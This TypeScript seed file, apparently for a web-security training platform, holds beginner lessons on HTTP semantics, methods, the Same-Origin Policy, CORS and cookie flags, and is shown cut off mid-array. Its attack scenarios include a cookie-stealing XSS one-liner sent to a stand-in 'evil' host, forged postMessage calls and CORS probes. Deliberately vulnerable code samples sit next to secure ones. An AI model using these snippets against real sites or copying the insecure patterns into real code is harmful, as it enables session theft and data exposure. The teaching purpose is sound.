import { ChallengeDifficulty, ChallengeStatus } from '@prisma/client';
import { LessonSeedData } from './auth-lessons';

export const FOUNDATIONS_LESSONS: LessonSeedData[] = [
  // -------------------------------------------------------------------------
  // 1. HTTP/1.1 vs HTTP/2 & Request Semantics
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'http2-header-semantics-lab',
    title: 'HTTP/1.1 vs HTTP/2 Request & Response Semantics (RFC 9110 & RFC 9113)',
    slug: 'foundations-http-semantics-wire',
    description:
      'An easy-to-understand walkthrough of how browsers and servers speak HTTP/1.1 and HTTP/2—covering request lines, HTTP/2 pseudo-headers (:method, :path, :authority), status codes, and MIME sniffing risks.',
    category: 'Foundations',
    difficulty: ChallengeDifficulty.BEGINNER,
    owaspReference: 'OWASP A00:2021 – Web Foundations (RFC 9110 & RFC 9113)',
    cweReference: 'CWE-444: Inconsistent Interpretation of HTTP Requests',
    cvssScore: 5.3,
    status: ChallengeStatus.PUBLISHED,
    overview:
      'Think of HTTP (Hypertext Transfer Protocol) as the postal letter system of the web. Every time you click a link, log in, or load an image, your browser writes a structured HTTP Request envelope ("Get me /profile from portal.example.com, and here is my login cookie") and sends it over TCP + TLS to a web server. The server reads that envelope and mails back an HTTP Response ("200 OK — here is your HTML page, formatted as text/html").\n\nTwo key global specifications govern this:\n• RFC 9110 (HTTP Semantics): Defines WHAT requests and responses mean (methods like GET/POST, headers like Host/Content-Type, status codes like 200/401/403/404).\n• RFC 9113 (HTTP/2): Defines HOW HTTP messages travel faster over the wire—replacing plain-text requests with binary multiplexed streams over a single TCP connection, compressing headers via HPACK, and introducing pseudo-headers (:method, :scheme, :authority, :path).',
    rootCause:
      'Many web security vulnerabilities happen because developers treat HTTP like plain text or assume every reverse proxy (Cloudflare, Nginx) and backend server parses headers identically. In HTTP/1.1, ambiguity between Content-Length and Transfer-Encoding causes Request Smuggling. In HTTP/2, failing to translate lowercase pseudo-headers (:authority -> Host) safely or omitting Content-Type / X-Content-Type-Options: nosniff lets attackers smuggle requests or trick browsers into executing uploaded text files as JavaScript.',
    mechanics:
      '1. DNS + TCP + TLS Setup: The browser resolves the domain IP, completes TCP 3-way handshake, and negotiates HTTPS/ALPN (selecting h2 for HTTP/2 or http/1.1).\n2. Building the Request:\n   • In HTTP/1.1 (text-based): "GET /api/user HTTP/1.1" followed by "Host: app.example.com" and header lines.\n   • In HTTP/2 (binary frames): Sent inside compressed HEADER frames using lower-case pseudo-headers:\n     :method = GET\n     :scheme = https\n     :authority = app.example.com\n     :path = /api/user\n3. Server Processing & Response Status Codes:\n   • 2xx (Success): 200 OK, 201 Created, 204 No Content\n   • 3xx (Redirect): 301/302 Redirect, 307/308 (preserves original HTTP method!)\n   • 4xx (Client Error): 400 Bad Request, 401 Unauthenticated (Who are you?), 403 Forbidden (I know you, no permission), 404 Not Found\n   • 5xx (Server Error): 500 Internal Error, 502 Bad Gateway\n4. Browser Rendering & MIME Checking: The server sends Content-Type: application/json. Adding X-Content-Type-Options: nosniff forces browsers NOT to guess or sniff HTML/JS inside non-HTML files.',
    attackScenario:
      '# HTTP/2 Pseudo-Header Downgrade & Header Injection Example\n# Attacker sends HTTP/2 request with malformed uppercase/newline or dual Host/:authority\n\n:method: GET\n:scheme: https\n:authority: app.example.com\n:path: /api/v1/health\nhost: internal-admin.local   <-- Conflicting Host vs :authority!\n\n# Insecure proxy forwards :authority to cache, but forwards Host header to backend:\nHTTP/1.1 200 OK\nContent-Type: text/plain\nX-Foundations-Trace: ctf-header-semantics\n# Missing "X-Content-Type-Options: nosniff" allows IE/legacy MIME sniffing if body contains <script>',
    securityImpact:
      'Header parsing mismatches enable HTTP Request Smuggling (CWE-444), Web Cache Poisoning (serving one user’s private response or malicious script to everyone else), Virtual Host Routing Bypass (reaching internal admin backends), and Cross-Site Scripting via MIME content sniffing.',
    prevention:
      '1. Enforce strict RFC 9110 & RFC 9113 compliant parsers at load balancers and proxies—immediately reject requests containing both Content-Length and Transfer-Encoding or mismatched :authority vs Host headers.\n2. Always speak HTTP/2 end-to-end when possible, or sanitize/normalize headers during HTTP/2-to-HTTP/1.1 downgrade.\n3. Explicitly set accurate Content-Type headers with charset (e.g., application/json; charset=utf-8) on every response.\n4. Always send X-Content-Type-Options: nosniff (OWASP ASVS V14.4.3) so browsers strictly respect declared MIME types.\n5. Never trust incoming Host headers for generating password reset links—use a server-side allowlisted canonical BASE_URL.',
    vulnerableCode: `// VULNERABLE: Trusts incoming Host header & omits nosniff / safe header validation
app.get('/reset-link', (req, res) => {
  // Attacker can spoof Host: evil.com or mismatched HTTP/2 :authority
  const resetUrl = \`https://\${req.headers.host}/reset?token=secret123\`;
  // Missing X-Content-Type-Options: nosniff
  res.send(\`Click here: \${resetUrl}\`);
});`,
    secureCode: `// SECURE: Validates headers, enforces nosniff, uses configured canonical origin
const CANONICAL_ORIGIN = process.env.APP_PUBLIC_URL || 'https://app.websec.local';

app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  next();
});

app.get('/reset-link', (_req, res) => {
  // Always construct sensitive URLs from trusted server config, never Host header
  const resetUrl = \`\${CANONICAL_ORIGIN}/reset?token=secret123\`;
  res.type('application/json').json({ resetUrl });
});`,
    codeLanguage: 'typescript',
    realWorldExample:
      'In 2021, researchers demonstrated widespread HTTP/2 Desync ("HTTP/2 Request Smuggling") against major CDNs and cloud load balancers where HTTP/2 binary frames containing newlines or mismatched :authority headers were downgraded into invalid HTTP/1.1 traffic, letting attackers hijack other users’ requests.',
    references: [
      { title: 'IETF RFC 9110: HTTP Semantics', url: 'https://www.rfc-editor.org/rfc/rfc9110.html' },
      { title: 'IETF RFC 9113: HTTP/2 Specification', url: 'https://www.rfc-editor.org/rfc/rfc9113.html' },
      { title: 'NIST SP 800-95: Guide to Secure Web Services', url: 'https://csrc.nist.gov/pubs/sp/800/95/final' },
      { title: 'OWASP ASVS V14: Configuration Requirements', url: 'https://owasp.org/www-project-application-security-verification-standard/' },
    ],
    keyTakeaways:
      '• HTTP/2 sends binary frames with lowercase pseudo-headers (:method, :path, :scheme, :authority).\n• Never trust the Host header for security decisions or password reset URLs.\n• Always send explicit Content-Type + X-Content-Type-Options: nosniff on every server response.',
  },

  // -------------------------------------------------------------------------
  // 2. Safe vs Idempotent HTTP Methods & Status Codes
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'http-method-verb-safety-lab',
    title: 'Safe vs Idempotent HTTP Methods, Verb Tampering & Status Codes (RFC 9110)',
    slug: 'foundations-http-methods-idempotency',
    description:
      'Learn why GET must never modify data, what "idempotent" means in real APIs, and how HTTP verb tampering bypasses weak authentication rules.',
    category: 'Foundations',
    difficulty: ChallengeDifficulty.BEGINNER,
    owaspReference: 'OWASP A01:2021 / RFC 9110 Section 9.2',
    cweReference: 'CWE-650: Trusting HTTP Permission Methods on the Server Side',
    cvssScore: 6.5,
    status: ChallengeStatus.PUBLISHED,
    overview:
      'Every HTTP request begins with a Method (also called a Verb), such as GET, POST, PUT, PATCH, DELETE, HEAD, or OPTIONS. RFC 9110 classifies HTTP methods using two simple properties:\n\n1. SAFE Methods (Read-Only): GET, HEAD, OPTIONS. Calling them should NEVER change anything on the server (no deleting users, no transferring money, no changing passwords). Why? Because browsers, search crawlers, and <img src="..."> tags fire GET requests automatically!\n2. IDEMPOTENT Methods ("Repeating equals doing it once"): GET, HEAD, OPTIONS, PUT, DELETE. If your Wi-Fi drops and you press "Delete Item #5" (DELETE /items/5) twice, Item #5 stays deleted—the server state does not double-change. By contrast, POST is NOT idempotent: calling POST /orders twice creates two separate orders and charges twice!',
    rootCause:
      'Developers frequently make two beginner mistakes: (1) Putting dangerous actions inside a GET route like GET /account/delete or GET /admin/approve?id=12 so a tiny link or image tag on any website triggers the action silently, and (2) Writing authorization checks only for POST or GET in firewall/middleware config while the backend framework also responds to PUT, HEAD, or lowercase/custom verbs (HTTP Verb Tampering).',
    mechanics:
      '1. Safe Read Violation: Suppose GET /api/transfer?to=bob&amount=500 transfers funds. A browser visiting any external page with <img src="https://bank.com/api/transfer?to=attacker&amount=500"> automatically fires a GET with your cookies!\n2. Middleware Verb Bypass: A legacy server rule blocks "GET" and "POST" to /admin/export without login, but fails to block "HEAD" or "PUT", or Express/Framework route matching falls through unexpectedly.\n3. Method Override Headers: Frameworks sometimes honor X-HTTP-Method-Override: DELETE inside a POST request—letting attackers bypass WAF rules looking only for literal DELETE requests.\n4. Redirect Status Code Quirk (302 vs 307): HTTP 301/302 often downgrades a browser POST request into GET on redirect, whereas HTTP 307/308 strictly preserves the original method and body.',
    attackScenario:
      '# 1. Auditing allowed methods using OPTIONS:\nOPTIONS /api/v1/admin/users HTTP/1.1\nHost: portal.websec.local\n\nHTTP/1.1 200 OK\nAllow: GET, POST, PUT, DELETE, OPTIONS\n\n# 2. HTTP Verb Tampering when security middleware only checks POST:\nGET /api/v1/admin/users HTTP/1.1   -> 403 Forbidden (Auth checked)\nHEAD /api/v1/admin/users HTTP/1.1  -> 200 OK (Headers & internal X-Admin-Token leaked!)\n\n# 3. Dangerous State Change on GET:\n<img src="https://portal.websec.local/logout-all-devices" width="0" height="0" />',
    securityImpact:
      'Allows trivial Cross-Site Request Forgery (CSRF) via links or <img> tags, unintended destructive actions triggered by browser link preloading/antivirus scanners, duplicate billing from non-idempotent retries, and complete authentication bypasses via HTTP Verb Tampering.',
    prevention:
      '1. Enforce strict HTTP method semantics: GET/HEAD/OPTIONS must be strictly read-only; state changes MUST use POST, PUT, PATCH, or DELETE.\n2. Apply authentication and authorization guards globally BEFORE route method matching (use router.use() / framework Guards, never per-method blacklists).\n3. Return 405 Method Not Allowed for unsupported HTTP verbs.\n4. Disable legacy X-HTTP-Method-Override headers unless strictly required and explicitly authorized.\n5. Use idempotency keys (Idempotency-Key header) on critical POST endpoints like payments.',
    vulnerableCode: `// VULNERABLE: State change in GET & per-verb auth gap
// Mistake 1: Modifying DB state inside a GET endpoint
app.get('/api/users/promote', (req, res) => {
  db.makeAdmin(req.query.userId); // Triggerable via any <img> or link!
  res.send('User promoted');
});

// Mistake 2: Firewall checks only POST, leaving PUT open
app.use((req, res, next) => {
  if (req.method === 'POST' && !req.user?.isAdmin) return res.status(403).end();
  next();
});
app.put('/api/settings', (req, res) => updateSettings(req.body));`,
    secureCode: `// SECURE: Default-deny global auth guard + POST for state change
const requireAdmin = (req, res, next) => {
  if (!req.user?.isAdmin) return res.status(403).json({ error: 'Forbidden' });
  next();
};

// Apply guard to ALL HTTP methods on this route prefix
app.use('/api/users', requireAdmin);
app.use('/api/settings', requireAdmin);

// Use POST (with CSRF protection / JSON body), never GET
app.post('/api/users/promote', (req, res) => {
  db.makeAdmin(req.body.userId);
  res.status(200).json({ status: 'promoted' });
});`,
    codeLanguage: 'typescript',
    realWorldExample:
      'In classic Google Web Accelerator incidents, prefetch bots automatically clicked every GET link on admin pages—accidentally deleting entire forums and user records because developers built "Delete" actions as simple <a href="/delete?id=12"> GET links instead of POST forms.',
    references: [
      { title: 'RFC 9110 Section 9: HTTP Methods', url: 'https://www.rfc-editor.org/rfc/rfc9110.html#name-methods' },
      { title: 'OWASP WSTG: Test HTTP Methods (WSTG-CONF-06)', url: 'https://owasp.org/www-project-web-security-testing-guide/' },
      { title: 'CWE-650: Trusting HTTP Permission Methods', url: 'https://cwe.mitre.org/data/definitions/650.html' },
    ],
    keyTakeaways:
      '• SAFE (GET/HEAD/OPTIONS) = read-only, never change database state.\n• IDEMPOTENT (GET/PUT/DELETE) = safe to retry without duplicate side effects; POST is NOT idempotent.\n• Enforce authentication on ALL verbs globally (deny by default), never just GET or POST.',
  },

  // -------------------------------------------------------------------------
  // 3. Same-Origin Policy (SOP)
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'same-origin-policy-boundaries-lab',
    title: 'Same-Origin Policy (SOP): The Browser’s Fundamental Security Wall',
    slug: 'foundations-same-origin-policy',
    description:
      'Master the single most important rule in browser security: what defines an "Origin" (scheme + host + port), why one tab cannot read your bank tab, and how read-vs-write rules work.',
    category: 'Foundations',
    difficulty: ChallengeDifficulty.BEGINNER,
    owaspReference: 'OWASP A00:2021 – Browser Security Model / ASVS V14',
    cweReference: 'CWE-346: Origin Validation Error',
    cvssScore: 7.5,
    status: ChallengeStatus.PUBLISHED,
    overview:
      'Imagine you have two browser tabs open: Tab A is logged into your online bank (https://bank.com), and Tab B visits a random meme blog (https://memes.evil). What stops malicious JavaScript on Tab B from silently sending `fetch("https://bank.com/api/balance")` with your session cookie and reading your bank balance?\n\nThe answer is the **Same-Origin Policy (SOP)**—the core wall inside every web browser!\n\nTwo URLs share the **Same Origin** ONLY if ALL THREE parts match identically:\n  1. **Scheme** (e.g., `http` vs `https`)\n  2. **Host / Domain** (exact match—even subdomains like `api.bank.com` vs `bank.com` are DIFFERENT origins!)\n  3. **Port** (e.g., `:443` vs `:8443`)\n\nWait: What surprises beginners is SOP’s asymmetry: SOP **BLOCKS reading** responses from another origin (`fetch`, `XMLHttpRequest`, accessing an `<iframe>` DOM), yet historically **ALLOWS embedding and sending simple writes** (`<img src="...">`, `<form action="..." method="POST">`, `<script src="...">`). Understanding that asymmetry explains BOTH **XSS** and **CSRF**!',
    rootCause:
      'Security failures occur when developers misunderstand SOP boundaries—such as mistakenly trusting subdomains (assuming `blog.company.com` cannot affect `bank.company.com` if cookies use `Domain=.company.com`), embedding untrusted third-party HTML inside `<iframe>` without `sandbox` attributes, or weakening `window.postMessage` listeners without checking `event.origin`.',
    mechanics:
      'Comparing against base origin `https://app.websec.local:443`:\n• `https://app.websec.local/dashboard` -> SAME ORIGIN (default HTTPS port is 443; path does NOT change origin!)\n• `http://app.websec.local/dashboard`  -> DIFFERENT ORIGIN (scheme differs: http vs https)\n• `https://api.websec.local/v1/me`    -> DIFFERENT ORIGIN (subdomain differs)\n• `https://app.websec.local:8443/me`   -> DIFFERENT ORIGIN (port 8443 vs 443)\n\nRead vs Write Behavior:\n• Cross-origin READ (`fetch("https://bank.com/api/me")`): Browser sends the request, checks CORS headers, and BLOCKS JavaScript from reading the response unless the server explicitly opted in.\n• Cross-origin EMBED / WRITE (`<form method="POST" action="https://bank.com/transfer">`): Browser DOES send the request (with cookies unless `SameSite` prevents it), which is why Anti-CSRF tokens and `SameSite` cookies are mandatory!\n• `postMessage` Bridge: Windows/iframes talk across origins using `window.postMessage(data, targetOrigin)`—if the receiver omits `if (event.origin !== "https://trusted.com") return;`, any attacker popup can inject forged messages!',
    attackScenario:
      '// Compare two origins & spot unsafe postMessage handler:\n// Page on https://app.websec.local receives cross-window messages\nwindow.addEventListener("message", (event) => {\n  // VULNERABLE: Never checked event.origin!\n  // An attacker page at https://evil.test opens a popup/iframe and sends:\n  // targetWin.postMessage({ action: "updateEmail", email: "pwned@evil.test" }, "*");\n  applySettings(event.data);\n});\n\n// Also dangerous: embedding user-uploaded HTML without sandbox:\n// <iframe src="https://app.websec.local/uploads/report.html"></iframe>\n// Same origin = full access to parent cookies & DOM!',
    securityImpact:
      'Bypassing SOP boundaries (via unsafe `postMessage`, same-origin untrusted HTML uploads, or relaxed CORS) allows attackers to read private emails/tokens across sites, forge authenticated requests (DOM XSS / CSRF), and hijack authenticated user sessions.',
    prevention:
      '1. Serve user-uploaded or untrusted HTML/SVG content from a completely separate sandboxed domain (e.g., `usercontent.websec-cdn.net`), never your main application origin!\n2. Use `<iframe sandbox="allow-scripts">` (omitting `allow-same-origin`) when embedding third-party widgets so the frame receives an isolated opaque `null` origin.\n3. In every `window.addEventListener("message", ...)` handler, ALWAYS strictly validate `event.origin` against an exact allowlist before reading `event.data`, and pass an exact `targetOrigin` (never `"*"`) when sending sensitive data.\n4. Set `Cross-Origin-Opener-Policy: same-origin` (COOP) on sensitive pages to sever cross-window opener references (`window.opener`).',
    vulnerableCode: `// VULNERABLE: Unsafe postMessage listener & un-sandboxed untrusted frame
window.addEventListener('message', (event) => {
  // Accepts commands from ANY malicious site on the internet!
  if (event.data?.type === 'LOAD_WIDGET') {
    document.getElementById('slot')!.innerHTML = event.data.html;
  }
});`,
    secureCode: `// SECURE: Strict exact origin check + safe text/DOM handling
const TRUSTED_WIDGET_ORIGIN = 'https://widgets.websec.local';

window.addEventListener('message', (event) => {
  // Strictly check origin tuple before trusting message data
  if (event.origin !== TRUSTED_WIDGET_ORIGIN) {
    return;
  }
  if (event.data?.type === 'STATUS_TEXT' && typeof event.data.text === 'string') {
    // Use textContent instead of innerHTML to block HTML/XSS injection
    document.getElementById('slot')!.textContent = event.data.text;
  }
});`,
    codeLanguage: 'typescript',
    realWorldExample:
      'Real-world bug bounties regularly pay thousands of dollars for "DOM XSS via postMessage" where a major web app embeds an iframe or opens an OAuth popup without validating `event.origin`, allowing any external page to inject JavaScript or steal OAuth codes.',
    references: [
      { title: 'MDN: Same-Origin Policy Explained', url: 'https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy' },
      { title: 'OWASP HTML5 Security Cheat Sheet (postMessage)', url: 'https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html' },
      { title: 'CWE-346: Origin Validation Error', url: 'https://cwe.mitre.org/data/definitions/346.html' },
    ],
    keyTakeaways:
      '• Origin = strictly (Scheme, Host, Port). Path does NOT matter; subdomains & ports DO create new origins.\n• SOP blocks cross-origin JavaScript READS, not simple cross-origin form/image WRITES (which is why CSRF defense is vital).\n• Always verify `event.origin` strictly in `postMessage`, isolate user uploads onto a separate domain, and sandbox untrusted iframes.',
  },

  // -------------------------------------------------------------------------
  // 6. CORS & Preflight Validation
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'cors-preflight-trust-flaws-lab',
    title: 'Cross-Origin Resource Sharing (CORS), Preflights & Misconfigurations',
    slug: 'foundations-cors-preflight-security',
    description:
      'Understand how CORS safely relaxes Same-Origin Policy when your frontend needs to call your backend API—and why reflecting req.headers.origin or trusting Origin: null breaks authentication security.',
    category: 'Foundations',
    difficulty: ChallengeDifficulty.EASY,
    owaspReference: 'OWASP A05:2021 – Security Misconfiguration / A01:2021',
    cweReference: 'CWE-942: Permissive Cross-domain Policy with Untrusted Domains',
    cvssScore: 8.1,
    status: ChallengeStatus.PUBLISHED,
    overview:
      'Suppose your React frontend runs on `https://app.websec.local`, and your NestJS API runs on `https://api.websec.local`. Because subdomains differ, the browser’s Same-Origin Policy blocks React from reading responses from the API!\n\n**CORS (Cross-Origin Resource Sharing)** is the standard W3C/WHATWG Fetch mechanism allowing the API server to tell the browser: "Hey browser, it’s okay—`https://app.websec.local` is allowed to read my responses."\n\nCORS uses two flows:\n1. **Simple Requests** (GET, HEAD, or form-encoded POST with no custom headers like `Authorization`): Browser sends the request right away with an `Origin` header, then checks `Access-Control-Allow-Origin` on the response before letting JavaScript see the body.\n2. **Preflighted Requests** (PUT, DELETE, JSON `Content-Type: application/json`, or custom headers like `Authorization`): Browser FIRST sends an automatic `OPTIONS` request asking permission (`Access-Control-Request-Method`, `Access-Control-Request-Headers`). Only if the server approves does the browser send the real request!',
    rootCause:
      'Three critical CORS developer mistakes completely destroy SOP protection:\n1. **Reflecting `req.headers.origin` dynamically** ("mirroring whatever Origin asks") together with `Access-Control-Allow-Credentials: true`—giving EVERY malicious website on the internet full authenticated read access!\n2. **Allowing `Origin: null`**—any attacker can create a `<iframe sandbox>` on their own site that sends `Origin: null` automatically!\n3. **Broken Regex Checks** like `origin.endsWith("websec.local")` or `origin.includes("websec.local")`—trivially bypassed by registering `evilwebsec.local` or `websec.local.attacker.com`!',
    mechanics:
      '1. Victim logs into `https://api.websec.local` (holds valid session cookie).\n2. Victim visits `https://evil.test`.\n3. `evil.test` executes:\n   `fetch("https://api.websec.local/api/profile/keys", { credentials: "include" })`\n4. Note: Browsers forbid combining `Access-Control-Allow-Origin: *` WITH `Access-Control-Allow-Credentials: true` (a built-in safety rail!). To "fix" local dev errors, a developer lazily codes:\n   `res.setHeader("Access-Control-Allow-Origin", req.headers.origin)` + `res.setHeader("Access-Control-Allow-Credentials", "true")`.\n5. Result: The API echoes `Access-Control-Allow-Origin: https://evil.test` and `ACAC: true`. The victim’s browser hands all private JSON data straight to the attacker’s JavaScript!\n6. Cache Poisoning Bonus Bug: If the server returns dynamic `Access-Control-Allow-Origin` WITHOUT `Vary: Origin`, a CDN may cache the permissive response and expose user data even more broadly.',
    attackScenario:
      '# 1. Attacker probes CORS trust policy using curl:\ncurl -i -s -H "Origin: https://attacker.example" \\\n  -H "Cookie: session=demo" https://api.websec.local/api/v1/account/secrets\n\n# VULNERABLE RESPONSE (Arbitrary Origin Reflection + Credentials!):\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://attacker.example\nAccess-Control-Allow-Credentials: true\nContent-Type: application/json\n\n{"apiKey": "sk_live_secret...", "email": "alice@websec.local"}\n\n# 2. Equally Dangerous "null" Origin Bypass:\ncurl -i -s -H "Origin: null" https://api.websec.local/api/v1/account/secrets\n-> Access-Control-Allow-Origin: null\n-> Access-Control-Allow-Credentials: true',
    securityImpact:
      'Complete breakdown of browser Same-Origin isolation: any external webpage visited by a logged-in user can steal private profile details, API keys, CSRF tokens, financial records, and internal dashboards via authenticated cross-origin `fetch()` calls.',
    prevention:
      '1. NEVER blindly reflect `req.headers.origin` into `Access-Control-Allow-Origin`!\n2. NEVER whitelist `Origin: null` in production.\n3. Validate `Origin` using an **exact string Set allowlist** of explicitly trusted origins (e.g., `new Set(["https://app.websec.local"])`)—avoid weak `.includes()` or unanchored regexes.\n4. Always send `Vary: Origin` whenever `Access-Control-Allow-Origin` varies by request origin.\n5. Only enable `Access-Control-Allow-Credentials: true` on origins that genuinely require cookies/credentials; remember CORS is NOT authentication enforcement (servers can still receive `curl` requests without an `Origin` header!).',
    vulnerableCode: `// VULNERABLE: Echoes arbitrary Origin header or checks naive substring
app.use((req, res, next) => {
  const origin = req.headers.origin;
  // Fatal Bug: Trusts any origin containing "websec.local" (e.g., https://websec.local.evil.com) or null!
  if (origin && (origin.includes('websec.local') || origin === 'null')) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  next();
});`,
    secureCode: `// SECURE: Strict exact origin Set allowlist + Vary: Origin + preflight handling
const TRUSTED_ORIGINS = new Set([
  'https://app.websec.local',
  'https://admin.websec.local',
]);

app.use((req, res, next) => {
  const origin = req.headers.origin;
  res.setHeader('Vary', 'Origin');

  if (typeof origin === 'string' && TRUSTED_ORIGINS.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  }

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }
  next();
});`,
    codeLanguage: 'typescript',
    realWorldExample:
      'James Kettle (PortSwigger Research) uncovered critical CORS misconfigurations across Bitcoin exchanges, cloud portals, and enterprise SaaS apps where reflecting `Origin` or trusting `null` let malicious ads silently drain authenticated user data cross-origin.',
    references: [
      { title: 'WHATWG Fetch Standard: CORS Protocol', url: 'https://fetch.spec.whatwg.org/#http-cors-protocol' },
      { title: 'PortSwigger: CORS Vulnerabilities Explained', url: 'https://portswigger.net/web-security/cors' },
      { title: 'CWE-942: Permissive Cross-domain Policy', url: 'https://cwe.mitre.org/data/definitions/942.html' },
    ],
    keyTakeaways:
      '• Browsers send an automatic `OPTIONS` preflight before non-simple cross-origin requests (JSON, PUT/DELETE, Authorization header).\n• Never reflect `req.headers.origin` or whitelist `Origin: null` with `Access-Control-Allow-Credentials: true`.\n• Always check an exact Set allowlist and emit `Vary: Origin`. Remember CORS protects browsers—servers still need real auth!',
  },

  // -------------------------------------------------------------------------
  // 7. Cookie Security Attributes (RFC 6265)
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'rfc6265-cookie-flags-lab',
    title: 'Cookie Security Attributes: HttpOnly, Secure & SameSite (RFC 6265)',
    slug: 'foundations-cookie-attributes-rfc6265',
    description:
      'Master RFC 6265 cookie defense flags in plain language: how HttpOnly stops XSS cookie theft, how Secure blocks Wi-Fi sniffing, how SameSite defeats CSRF, and why __Host- locks cookie scope.',
    category: 'Foundations',
    difficulty: ChallengeDifficulty.BEGINNER,
    owaspReference: 'OWASP A07:2021 / IETF RFC 6265 & OWASP ASVS V3.4',
    cweReference: 'CWE-1004: Sensitive Cookie Without HttpOnly Flag',
    cvssScore: 7.5,
    status: ChallengeStatus.PUBLISHED,
    overview:
      'HTTP is **stateless**—every single HTTP request arrives with zero built-in memory of who you were 1 second ago! To keep you logged in as you click from page to page, servers hand your browser a **Cookie** using the `Set-Cookie` HTTP response header (standardized in **IETF RFC 6265**), and your browser automatically attaches that `Cookie:` header on future matching requests.\n\nBecause your session cookie IS your temporary identity key, leaving off cookie security flags is like leaving your house key taped to your front door:\n• **`HttpOnly`**: Locks the door against JavaScript! `document.cookie` CANNOT read an `HttpOnly` cookie—stopping XSS from stealing your session ID directly.\n• **`Secure`**: Locks the door against unencrypted networks! The browser will ONLY send the cookie over HTTPS connections, never over plain HTTP.\n• **`SameSite`** (`Strict`, `Lax`, or `None`): Locks the door against Cross-Site Request Forgery (CSRF)! Controls whether your cookie is sent when a *different website* sends a request to your site.\n• **`__Host-` Prefix**: Locks the cookie strictly to the exact domain + `Path=/` + `Secure` (cannot even be set or overwritten by compromised sibling subdomains!).',
    rootCause:
      'Developers often create cookies simply as `Set-Cookie: sid=abc123; Path=/`—omitting `HttpOnly` (leaving sessions open to `document.cookie` theft via XSS), omitting `Secure` (allowing downgrade leakage over HTTP), leaving `SameSite=None` (sending cookies on malicious cross-site forms), or overly broadening `Domain=.example.com` (exposing production login cookies to vulnerable staging/marketing subdomains!).',
    mechanics:
      'Step-by-step lifecycle of RFC 6265 Cookie Flags:\n1. **`HttpOnly`** (CWE-1004 Defense):\n   • With `HttpOnly`: Browser attaches the cookie on HTTP requests automatically, but `console.log(document.cookie)` returns empty for that cookie.\n2. **`Secure`** (CWE-614 Defense):\n   • Browser refuses to send the cookie on `http://` links, images, or redirects—TLS only.\n3. **`SameSite` Modes** (RFC 6265bis Defense):\n   • `SameSite=Strict`: Cookie NEVER sent on ANY cross-site request (not even clicking an external link to your site!). Best for high-security admin portals.\n   • `SameSite=Lax` (Modern Browser Default): Sent on safe top-level link clicks (`<a href="...">`), BLOCKED on cross-site `<form method="POST">`, `<img>`, and background XHR/fetch!\n   • `SameSite=None`: Sent on cross-site requests (MUST also include `Secure`!). Only use when intentionally embedding cross-site widgets/SSO.\n4. **`Domain` & `Path` Scoping Trap + `__Host-` Prefix**:\n   • `Domain` omitted ("Host-Only Cookie"): ONLY `app.example.com` receives it (safest!). Adding `Domain=example.com` shares it with `old-blog.example.com`!\n   • Remember: `Path=/admin` is NOT a security boundary—any XSS on `/public` can iframe `/admin` and read/use it!\n   • Prefixing `__Host-sid=...` forces browsers to reject the cookie unless `Secure` is set, `Path=/` is set, and `Domain` is omitted.',
    attackScenario:
      '# INSECURE Set-Cookie Header (Fails RFC 6265 & OWASP ASVS V3.4):\nSet-Cookie: session_id=9f8e7d6c5b4a; Path=/; Domain=.websec.local\n\n# 3 Failures in One Line:\n# 1. Missing HttpOnly -> XSS can run: new Image().src="https://evil/?c="+document.cookie\n# 2. Missing Secure -> Loading http://websec.local leaks cookie in plaintext\n# 3. Domain=.websec.local -> Compromised static.websec.local can overwrite or toss cookies\n\n# SECURE RFC 6265 & ASVS V3.4 Compliant Header:\nSet-Cookie: __Host-session_id=9f8e7d6c5b4a; Path=/; Secure; HttpOnly; SameSite=Lax',
    securityImpact:
      'Missing `HttpOnly` allows single-line XSS session hijacking; missing `Secure` leaks active session tokens over public Wi-Fi; missing `SameSite` (and missing CSRF tokens) permits unauthorized money transfers/password changes via CSRF; broad `Domain` lets any vulnerable subdomain poison or hijack root logins.',
    prevention:
      '1. Set `httpOnly: true` on ALL authentication, session, and refresh token cookies (ASVS V3.4.2).\n2. Set `secure: true` on ALL sensitive cookies in HTTPS environments (ASVS V3.4.1).\n3. Set `sameSite: "lax"` (default) or `sameSite: "strict"` for administrative sessions (ASVS V3.4.3), paired with CSRF tokens for state-changing requests.\n4. Omit the `domain` attribute so cookies stay host-only, and adopt the `__Host-` cookie name prefix over HTTPS.\n5. Never trust `Path=/admin` alone as access control isolation between apps on the same origin.',
    vulnerableCode: `// VULNERABLE: Weak Express cookie setup missing all critical flags
res.cookie('session_id', signedToken, {
  domain: '.websec.local', // Shared with all subdomains!
  httpOnly: false,         // Readable by JavaScript / XSS!
  secure: false,           // Sent over plain HTTP!
  maxAge: 7 * 24 * 60 * 60 * 1000,
});`,
    secureCode: `// SECURE: Hardened RFC 6265 & OWASP ASVS V3.4 cookie configuration
const isProd = process.env.NODE_ENV === 'production';

res.cookie(isProd ? '__Host-session_id' : 'session_id', signedToken, {
  httpOnly: true,          // Invisible to document.cookie
  secure: isProd,          // HTTPS only in production (__Host- requires HTTPS)
  sameSite: 'lax',         // Blocks cross-site POST CSRF while allowing links
  path: '/',               // Required for __Host- host-only lock
  // Notice: Do NOT set "domain" so cookie stays strictly scoped to exact host!
  maxAge: 2 * 60 * 60 * 1000, // Short 2-hour session lifetime
});`,
    codeLanguage: 'typescript',
    realWorldExample:
      'In early web platforms (like early Firesheep Wi-Fi sniffing days in 2010), major social networks sent login pages over HTTPS but left session cookies without the `Secure` flag—allowing anyone on the same coffee-shop Wi-Fi to hijack active accounts in one click.',
    references: [
      { title: 'IETF RFC 6265: HTTP State Management (Cookies)', url: 'https://www.rfc-editor.org/rfc/rfc6265.html' },
